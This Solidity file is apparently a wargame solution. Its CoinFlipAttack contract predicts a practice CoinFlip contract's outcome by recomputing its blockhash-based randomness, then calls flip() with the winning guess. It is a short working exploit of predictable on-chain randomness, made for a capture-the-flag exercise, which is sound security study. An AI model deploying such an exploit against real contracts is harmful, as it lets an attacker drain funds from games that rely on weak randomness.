// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { CoinFlip} from "../../src/4/CoinFlip.sol";

contract CoinFlipAttack {

    CoinFlip orgContract;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        orgContract = CoinFlip(_coinFlipAddress);
    }

    function attack() public  {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 guess = blockValue / FACTOR;
        bool side = guess == 1 ? true : false;
        orgContract.flip(side);

  }

}